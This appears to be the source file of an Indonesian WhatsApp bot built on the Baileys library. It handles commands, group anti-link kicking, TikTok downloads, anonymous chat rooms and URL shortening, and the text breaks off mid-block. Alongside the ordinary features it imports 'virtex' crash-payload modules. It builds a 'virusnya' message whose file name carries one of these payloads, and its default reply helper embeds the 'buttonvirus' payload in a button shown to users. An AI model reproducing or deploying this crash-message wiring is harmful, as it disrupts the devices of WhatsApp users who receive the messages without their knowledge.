// CREATE BY LEXXY OFFICIAL < thx base nya suhu >
// Recode + Fix By Ekuzika


"use strict";
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_menfes_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { cerpen } = require('./function/Search_Cerpen')
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat } = require('@bochilteam/scraper')
const { listmenu, rulesBot, donasiBot, infoOwner } = require('./help')
const { jadibot, listJadibot } = require('./function/jadibot')
const { buttonvirus } = require('./function/buttonvirus')
const yts = require('./yt-search')
const textpro = require('./function/textpro')
const photooxy = require('./function/photooxy')

// database virtex
const { philips } = require('./function/virtex/philips')
const { virus } = require('./function/virtex/virus')
const { ngazap } = require('./function/virtex/ngazap')

// database module pelengkap
const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()
var Jimp = require('jimp');
ffmpeg.setFfmpegPath(ffmpegPath);
const util = require('util')
const syntaxerror = require('syntax-error')

const Exif = require("./function/set_WM_Sticker")
const exif = new Exif()
const os = require("os");
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
const { Configuration, OpenAIApi } = require("openai")

const msgFilter = require("./function/func_Spam");
const { stalkff, stalkml } = require("./function/func_Stalker");
const mekih = fs.readFileSync('./function/mod.jpg')

let orang_spam = []
let medianya = []

const mess = mess_JSON
const setting = setting_JSON
const antilink = antilink_JSON
const db_user = db_user_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_menfes = db_menfes_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async (conn, msg, m, setting, store) => {
  try {
    let { ownerNumber, botName, smm_dana_nama, smm_dana_number, AIapi, orgnya } = setting
    const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
    if (msg.isBaileys) return
    const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
    const tanggal = moment().tz("Asia/Jakarta").format("ll")
    let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
    const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1)
    const content = JSON.stringify(msg.message)
    const from = msg.key.remoteJid
    const time = moment(new Date()).format("HH:mm");
    var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
    if (chats == undefined) { chats = '' }
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
    const isGroup = msg.key.remoteJid.endsWith('@g.us')
    const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
    const pushname = msg.pushName
    const body = chats.startsWith(prefix) ? chats : ''
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const isCommand = body.startsWith(prefix);
    const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
    const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
    const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
    const isOwner = [`${setting.ownerNumber}`, "628889616144@s.whatsapp.net", botNumber].includes(sender) ? true : false

    const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
    const groupName = isGroup ? groupMetadata.subject : ''
    const groupId = isGroup ? groupMetadata.id : ''
    const participants = isGroup ? await groupMetadata.participants : ''
    const groupMembers = isGroup ? groupMetadata.participants : ''
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
    const isGroupAdmins = groupAdmins.includes(sender)

    const isWelcome = isGroup ? welcomeJson.includes(from) : false
    const isAntiLink = antilink.includes(from) ? true : false
    const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

    const quoted = msg.quoted ? msg.quoted : msg
    var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
    var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
    const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
    var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
    var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
    const isListMessage = dataListG.length !== 0 ? dataListG : dataList

    const isImage = (type == 'imageMessage')
    const isQuotedMsg = (type == 'extendedTextMessage')
    const isMedia = (type === 'imageMessage' || type === 'videoMessage');
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
    const isVideo = (type == 'videoMessage')
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const isSticker = (type == 'stickerMessage')
    const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
    const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

    const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
    const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
    const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
    mention != undefined ? mention.push(mentionByReply) : []
    const mentionUser = mention != undefined ? mention.filter(n => n) : []

    try {
      var pp_user = await conn.profilePictureUrl(sender, 'image')
    } catch {
      var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
    }

    const PathAuto = "./function/menuPath/"

    function mentions(teks, mems = [], id) {
      if (id == null || id == undefined || id == false) {
        let res = conn.sendMessage(from, { text: teks, mentions: mems })
        return res
      } else {
        let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
        return res
      }
    }

    const formatSize = sizeFormatter({
      std: "JEDEC",
      decimalPlaces: "2",
      keepTrailingZeroes: false,
      render: (literal, symbol) => `${literal} ${symbol}B`,
    });
    // Check Bandwidth
    async function checkBandwidth() {
      var data = require("node-os-utils")
      data = await data.netstat.stats()
      let ind = 0
      let out = 0
      for (let i of data) {
        ind = ind + i.inputBytes
        out = out + i.outputBytes
      }
      return {
        download: formatSize(ind),
        upload: formatSize(out)
      }
    }

    function monospace(string) {
      return '```' + string + '```'
    }

    function parseMention(text = '') {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }

    const ftroli = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 404, status: 1, surface: 1, message: 'GuraBot - MD', orderTitle: 'GuraBot - MD', thumbnail: fs.readFileSync('./function/menuPath/thumb.jpg'), sellerJid: '0@s.whatsapp.net' } } }

    const lep = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...({ remoteJid: "" })
      },
      message: {
        "imageMessage": {
          "mimetype": "image/jpeg",
          "caption": `${pushname}`,
          "jpegThumbnail": pp_user
        }
      }
    }

    async function replyNya(teks) {
      const buttonsDefault = [{ quickReplyButton: { displayText: `${buttonvirus}`, id: `.menu` } }]
      const buttonMessage = {
        text: teks,
        footer: "",
        templateButtons: buttonsDefault,
        image: { url: pp_user }
      }
      return conn.sendMessage(from, buttonMessage)
    }

    const virusnya = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
      },
      "message": {
        "documentMessage": {
          "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          "mimetype": "application/octet-stream",
          "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          "fileLength": "64455",
          "pageCount": 1,
          "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          "fileName": `GuraBot-MD ${ngazap(prefix)}`,
          "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
        }
      }
    }

    async function ephoto(url, texk) {
      const cheerio = require('cheerio')
      const FormData = require('form-data')
      let form = new FormData
      let gT = await axios.get(url, {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }
      })
      let $ = cheerio.load(gT.data)
      let text = texk
      let token = $("input[name=token]").val()
      let build_server = $("input[name=build_server]").val()
      let build_server_id = $("input[name=build_server_id]").val()
      form.append("text[]", text)
      form.append("token", token)
      form.append("build_server", build_server)
      form.append("build_server_id", build_server_id)
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders()
        }
      })
      let $$ = cheerio.load(res.data)
      let json = JSON.parse($$("input[name=form_value_input]").val())
      json["text[]"] = json.text
      delete json.text
      let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"].join("; ")
        }
      })
      return build_server + data.image
    }

    const q1 = q.split('&')[0];
    const q2 = q.split('&')[1];
    const q3 = q.split('&')[2];
    const q4 = q.split('&')[3];
    const q5 = q.split('&')[4];
    const q6 = q.split('&')[5];
    const q7 = q.split('&')[6];
    const q8 = q.split('&')[7];
    const q9 = q.split('&')[8];
    const q10 = q.split('&')[9];
    const q11 = q.split('&')[10];
    const q12 = q.split('&')[11];
    const q13 = q.split('&')[12];
    const q14 = q.split('&')[13];
    const q15 = q.split('&')[14];
    const q16 = q.split('&')[15];

    const isEmoji = (emo) => {
      let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
      let regexEmoji = new RegExp(emoji_ranges, 'gi');
      return emo.match(regexEmoji)
    }

    const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: msg }) }

    if (isGroup && isAntiLink) {
      if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
      var linkgce = await conn.groupInviteCode(from)
      if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
        reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
      } else if (isUrl(chats)) {
        let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
        if (isGroupAdmins) return reply(bvl)
        if (fromMe) return reply(bvl)
        if (isOwner) return reply(bvl)
        await conn.sendMessage(from, { delete: msg.key })
        mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
        await sleep(3000)
        conn.groupParticipantsUpdate(from, [sender], "remove")
      } else {
      }
    }

    if (isGroup && isAutoDownTT) {
      if (chats.match(/(tiktok.com)/gi)) {
        reply('Url tiktok terdekteksi\nWait mengecek data url.')
        var btn_ttgc = [
          { buttonId: `!ttmp3 ${chats}`, buttonText: { displayText: '⋮☰ 𝐌𝐏𝟑' }, type: 1 },
        ]
let tt_gc = await fetchJson(`https://api.akuari.my.id/downloader/tiktok3?link=${chats}`)
 if (tt_gc.message) return reply(tt_gc.message)
var dl_gc = tt_gc.hasil
let ttgc_cap = ` Tiktok - Downloader 

Username: ${dl_gc.username}
Like: ${dl_gc.like}
Comment: ${dl_gc.comment}
Share: ${dl_gc.share}
Views: ${dl_gc.views}
`
        conn.sendMessage(from, { caption: ttgc_cap, video: { url: dl_gc.download_mp4_hd }, buttons: btn_ttgc, footer: '© Gurabot - MD' })
    }
}

    if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
      var get_data_respon = getDataResponList(from, chats, db_respon_list)
      if (get_data_respon.isImage === false) {
        conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
          quoted: msg
        })
      } else {
        conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
          quoted: msg
        })
      }
    }

    const sendContact = (jid, numbers, name, quoted, mn) => {
      let number = numbers.replace(/[^0-9]/g, '')
      const vcard = 'BEGIN:VCARD\n'
        + 'VERSION:3.0\n'
        + 'FN:' + name + '\n'
        + 'ORG:;\n'
        + 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
        + 'END:VCARD'
      return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions: mn ? mn : [] }, { quoted: quoted })
    }

    function toRupiah(angka) {
      var saldonyeini = '';
      var angkarev = angka.toString().split('').reverse().join('');
      for (var i = 0; i < angkarev.length; i++)
        if (i % 3 == 0) saldonyeini += angkarev.substr(i, 3) + '.';
      return '' + saldonyeini.split('', saldonyeini.length - 1).reverse().join('');
    }

    let cekUser = (satu, dua) => {
      let x1 = false
      Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == dua) { x1 = i }
      })
      if (x1 !== false) {
        if (satu == "id") { return db_user[x1].id }
        if (satu == "name") { return db_user[x1].name }
        if (satu == "seri") { return db_user[x1].seri }
        if (satu == "premium") { return db_user[x1].premium }
      }
      if (x1 == false) { return null }
    }

    let setUser = (satu, dua, tiga) => {
      Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == dua) {
          if (satu == "±id") {
            db_user[i].id = tiga
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
          }
          if (satu == "±name") {
            db_user[i].name = tiga
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
          }
          if (satu == "±seri") {
            db_user[i].seri = tiga
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
          }
          if (satu == "±premium") {
            db_user[i].premium = tiga
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
          }
        }
      })
    }

    const cekPesan = (satu, dua) => {
      let x2 = false
      Object.keys(db_menfes).forEach((i) => {
        if (db_menfes[i].id == dua) { x2 = i }
      })
      if (x2 !== false) {
        if (satu == "id") { return db_menfes[x2].id }
        if (satu == "teman") { return db_menfes[x2].teman }
      }
      if (x2 == false) { return null }
    }

    const setRoom = (satu, dua, tiga) => {
      Object.keys(db_menfes).forEach((i) => {
        if (db_menfes[i].id == dua) {
          if (satu == "±id") {
            db_menfes[i].id = tiga
            fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
          }
          if (satu == "±teman") {
            db_menfes[i].teman = tiga
            fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
          }
        }
      })
    }

    conn.readMessages([msg.key])

    if (command === 'buatroom') {
      if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat.")
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          id: sender,
          session: "buatroom",
          data: {
            penerima: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan tulis Nomor WhatsApp yg ingin Di ajak ngobrol*\n\n*Contoh:* 628xxxx")
      } else {
        reply("Kamu Sedang di dalam sesi room chat, menunggu konfirmasi dari penerima.")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "buatroom") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!")
          data_deposit.data.penerima = Number(chats);
          if (data_deposit.data.penerima == sender.split('@')[0]) return reply('jangan nomor lu')
          if (data_deposit.data.penerima == botNumber.split('@')[0]) return reply('itu kan nomor bot')
          var cekap = await conn.onWhatsApp(chats + "@s.whatsapp.net")
          if (cekap.length == 0) return reply(`Nomor +${chats}\ntidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`)
          data_deposit.session = "number_orang";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          var penerimanyo = data_deposit.data.penerima + '@s.whatsapp.net'
          mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])
          let roomC = `#${makeid(10)}`
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
          var text_tersambung = `*Seseorang Mengajak Chating*\n\n*Dari:* Rahasia\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
          let btn_room = [{ buttonId: `${prefix}buat_room_chat ${sender}|${data_deposit.data.penerima}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Terima️' }, type: 1 }]
          var but_room = {
            text: text_tersambung,
            footer: 'Klik button untuk menerima chat.',
            buttons: btn_room,
            mentions: [penerimanyo],
            headerType: 1
          }
          conn.sendMessage(`${data_deposit.data.penerima}@s.whatsapp.net`, but_room)
        }
      }
    } else if (command === 'setnamabot') {
      if (!isOwner) return reply(mess.OnlyOwner)
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "setnamebot",
          data: {
            nama_baru: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Ok siap ownerku*\n*Tulis nama bot baru ya*")
      } else {
        reply("nama bot nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "setnamebot") {
          if (chats.length === 0) return;
          data_deposit.data.nama_baru = (chats)
          data_deposit.session = "nama_barunya";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*SETNAMABOT SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${setting.botName}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
          await sleep(2000)
          setting.botName = data_deposit.data.nama_baru
          fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
          await sleep(2000)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'changename') {
      if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "changename",
          data: {
            nama_baru: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*namalu apa? biar bot ganti*")
      } else {
        reply("nama nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "changename") {
          if (chats.length === 0) return;
          data_deposit.data.nama_baru = (chats)
          data_deposit.session = "nama_barunya";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*SETNAMA SUKSES*
_*ID:* @${sender.split('@')[0]}_
_*Nama Lama:* ${cekUser("name", sender)}_
_*Nama Baru:* ${data_deposit.data.nama_baru}_
_*Waktu:* ${jam} WIB_`)
          await sleep(1000)
          setUser("±name", sender, data_deposit.data.nama_baru)
          await sleep(2000)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'bitly_short') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "bitly_shortlink",
          data: {
            trannss: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim url yang ingin di shortilink ke bitly.*\n\n*Contoh:* https://google.com")
      } else {
        reply("Link url nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "bitly_shortlink") {
          if (chats.length === 0) return;
          data_deposit.data.trannss = (chats)
          let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/bitly?url=${data_deposit.data.trannss}&apikey=danzz`)
          if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
          data_deposit.session = "input_texttttranss";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*SHORTLINK*

*TYPE*
https://bitly.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'tinyurl_short') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "tinyurl_shortlink",
          data: {
            trannss: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim url yang ingin di shortilink ke tinyurl.*\n\n*Contoh:* https://google.com")
      } else {
        reply("Link url nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "tinyurl_shortlink") {
          if (chats.length === 0) return;
          data_deposit.data.trannss = (chats)
          let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/tinyurl?url=${data_deposit.data.trannss}&apikey=danzz`)
          if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
          data_deposit.session = "input_texttttranss";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*SHORTLINK*

*TYPE*
https://tinyurl.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'cuttly_short') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "cuttly_shortlink",
          data: {
            trannss: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim url yang ingin di shortilink ke cuttly.*\n\n*Contoh:* https://google.com")
      } else {
        reply("Link url nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "cuttly_shortlink") {
          if (chats.length === 0) return;
          data_deposit.data.trannss = (chats)
          let ii = await fetchJson(`https://danzzapi.xyz/api/shortlink/cuttly?url=${data_deposit.data.trannss}&apikey=danzz`)
          if (ii.status == false) return reply('url tidak valid\nsilahkan kirim yg benar.')
          data_deposit.session = "input_texttttranss";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*SHORTLINK*

*TYPE*
https://cutt.ly/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_deposit.data.trannss}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'translate') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "translate",
          data: {
            trannss: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim text yang ingin jadi translate ke inggris.*\n\n*Contoh:* Hai sayang")
      } else {
        reply("Text nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "translate") {
          if (chats.length === 0) return;
          data_deposit.data.trannss = (chats)

          var en = await fetchJson(`https://api.popcat.xyz/translate?to=en&text=${data_deposit.data.trannss}`)
          data_deposit.session = "input_texttttranss";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*TRANSLATE*
*IND :* ${data_deposit.data.trannss}
*EN :* ${en.translated}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'stalktiktok') {
      if (!fs.existsSync(PathAuto + sender.split('@')[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalktiktok",
          data: {
            usrname_ny: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan ketik Username TikTok nya*\n*Contoh:* chikakiku")
      } else {
        reply("Username TikTok nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
